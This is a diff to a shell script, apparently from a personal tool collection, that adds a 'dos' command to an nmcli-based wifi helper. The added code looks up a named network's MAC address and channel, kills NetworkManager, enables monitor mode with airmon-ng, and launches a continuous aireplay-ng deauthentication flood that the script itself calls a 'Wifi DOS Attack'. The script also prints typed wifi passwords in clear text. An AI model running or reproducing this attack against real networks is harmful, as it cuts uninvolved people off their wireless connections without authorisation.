@@ -1,6 +1,7 @@
-source $PODGL/lib/colors
+source $PODGL/lib/fsh.cfg.sh
+NetworkManager &> /dev/null
 if [ "$1" == "" ]; then
-  printf "${green}Usage$white:\n   -$green wifi${white} connect <wirless_name>\n   - ${green}wifi${white} scan\n"
+  printf "${green}Usage$white:\n   -$green wifi${white} connect <wifi name>\n   - ${green}wifi${white} scan\n${green}wifi$white dos <wifi name>\n"
 fi
 connect(){
   if [ $1 == "" ]; then
@@ -9,11 +10,56 @@ connect(){
   printf "Password: "
   read ps
   printf $green"Connecting To $1 With Password $ps...$white\n"
-  nmcli dev wifi connect $1 password $ps
+  nmcli dev wifi connect "$1" password "$ps"
 }
 
 scan(){
   nmcli dev wifi list
 }
 
+mac(){
+        local maca=$(scan | grep "$1" | head -c 25 | sed s/' '/''/g)
+	printf "$maca\n" | sed s/"*"/''/g
+}
+interface=
+restart(){
+	cout "Cleaning And Resetting Interface to it's Normal Stat... (Please Do Not Interupt Now)..."
+	airmon-ng stop ${interface}mon &> /dev/null
+	NetworkManager &> /dev/null
+	cout "DONE !"
+}
+channel(){
+        tmp=$(echo "$1" | sed s/' '/''/g)
+        printf "$($PODGL/run/out 5 $(scan | grep "$1"| sed s/"$1"/"$tmp"/g | sed s/"*"/''/g))\n"
+}
+dos(){
+	trap restart SIGINT
+	macaddr=$(scan | grep "$1" | head -c 25 | sed s/' '/''/g | sed s/"*"/''/g)
+	if [ "$macaddr" == '' ];then
+		cerr "No Wifi Network With Name $1 Found"
+		exit 1
+	fi
+	echo "$1"
+	tmp=$(echo "$1" | sed s/' '/''/g)
+	channel=$($PODGL/run/out 5 $(scan | grep "$1"| sed s/"$1"/"$tmp"/g | sed s/"*"/''/g))
+	inform "Target Network MAC:     $macaddr"
+	sleep 1
+	inform "Target Network Channel: $channel"
+	sleep 1
+	printf "[$blue<$white] Please Enter Wireless Interface To Launch The Attack From: "
+	read interface
+        cout "Don't Forget To Run After The Attack: airmon-ng stop $interface && service NetworkManager start"
+	sleep 0.5
+	cout "Killing Some Processes Thats Prevent Monitor Mode (NetworkManager + WPAsupplicant)..."
+	airmon-ng check kill &> /dev/null
+	airmon-ng start $interface $channel &> /dev/null
+	cout "Started Monitor Mode on $GREEN$interface$WHITE"
+	sleep 0.5
+	cout "Launching The Attack After 5 Seconds, To Stop Press CTRL-C"
+	sleep 6
+	warn "Launching Wifi ${RED}DOS Attack$WHITE Against $RED$1$WHITE Now !!!!"
+	sleep 1
+	cout "Deauthentication Attack Successfully Launched, To Stop ${GREEN}PRESS CTRL-C$WHITE"
+	aireplay-ng -00 -a "$macaddr" ${interface}mon &> /dev/null
+}
 $1 $2
